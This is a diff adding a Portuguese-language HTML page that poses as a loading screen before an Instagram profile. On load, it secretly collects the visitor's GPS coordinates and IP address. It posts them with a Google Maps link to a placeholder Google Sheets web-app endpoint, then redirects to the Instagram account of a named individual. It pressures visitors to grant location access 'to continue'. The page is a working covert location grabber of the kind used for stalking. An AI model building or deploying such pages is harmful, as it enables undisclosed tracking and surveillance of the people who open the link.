@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Localizando...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  </style>
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sucesso, erro);
+      } else {
+        document.body.innerHTML = "<p>Seu navegador não suporta geolocalização.</p>";
+      }
+    };
+
+    function sucesso(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Captura o IP do visitante
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          // Envia os dados para sua planilha no Google Sheets
+          fetch('SEU_WEBAPP_URL_AQUI', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude,
+              ip: ip,
+              maps: mapsLink
+            })
+          });
+
+          // Após capturar, redireciona para o Instagram
+          redirecionaInstagram();
+        });
+    }
+
+    function erro(err) {
+      console.warn("Geolocalização não permitida ou erro:", err);
+      document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
+    }
+
+    function redirecionaInstagram() {
+      window.location.href = "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
+    }
+  </script>
+</head>
+<body>
+  <p>📍 Obtendo sua localização... Aguarde...</p>
+</body>
+</html>
